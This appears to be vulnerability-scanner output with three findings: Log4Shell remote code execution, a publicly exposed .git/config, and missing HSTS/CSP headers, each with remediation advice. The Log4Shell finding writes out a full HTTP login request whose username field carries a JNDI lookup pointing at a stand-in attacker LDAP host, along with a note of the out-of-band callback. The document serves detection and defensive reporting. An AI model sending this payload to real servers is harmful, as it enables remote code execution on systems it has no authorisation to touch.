info.name: Apache Log4j2 Remote Code Execution (Log4Shell)
author: pdteam
info.description: Apache Log4j2 versions 2.0-beta9 through 2.15.0 (excluding 2.12.2) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
info.remediation: Upgrade Apache Log4j2 to a version of 2.17.0 (Java 8) or 2.12.3 (Java 7) or 2.3.1 (Java 6).

request:
POST /login HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"username":"${jndi:ldap://attacker.example.com/a}","password":"x"}
response:
HTTP/1.1 200 OK
Content-Length: 18

{"status":"ok"}
[Out-of-band callback received on attacker LDAP server]

info.name: Publicly Exposed .git/config
author: pdteam
info.description: The repository's .git/config file is reachable on the public web server, exposing remote URLs and potentially credentials.
info.remediation: Block access to .git/ at the web server or reverse proxy layer.

info.name: HTTP Missing Security Headers (Strict-Transport-Security, CSP)
author: pdteam
info.description: The response does not include Strict-Transport-Security and Content-Security-Policy headers, leaving the site exposed to protocol-downgrade and cross-site scripting risks.
info.remediation: Add Strict-Transport-Security (HSTS) and a restrictive Content-Security-Policy header to all responses at the edge / framework layer.
